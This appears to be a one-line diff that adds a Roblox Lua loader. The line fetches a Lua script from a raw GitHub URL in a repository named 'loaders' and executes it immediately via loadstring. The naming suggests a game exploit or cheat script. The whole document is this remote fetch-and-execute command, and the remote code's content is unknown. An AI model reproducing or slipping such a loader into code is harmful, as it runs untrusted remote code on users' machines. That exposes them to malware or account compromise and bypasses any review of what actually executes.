@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam0-op9fi8yiie5vpe.lua"))()
